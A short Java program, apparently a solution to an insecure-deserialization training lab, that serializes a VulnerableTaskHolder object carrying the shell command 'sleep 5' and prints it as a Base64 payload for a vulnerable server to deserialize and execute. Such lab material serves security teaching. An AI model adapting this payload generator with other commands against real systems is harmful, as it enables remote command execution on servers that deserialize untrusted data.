package org.dummy.insecure.framework;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class main {
    static public void main(String[] args){
        try{
            VulnerableTaskHolder go = new VulnerableTaskHolder("sleep", "sleep 5");
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(bos);
            oos.writeObject(go);
            oos.flush();
            byte[] exploit = bos.toByteArray();
            String exp = Base64.getEncoder().encodeToString(exploit);
            System.out.println(exp);
        } catch (Exception e){

        }

    }
}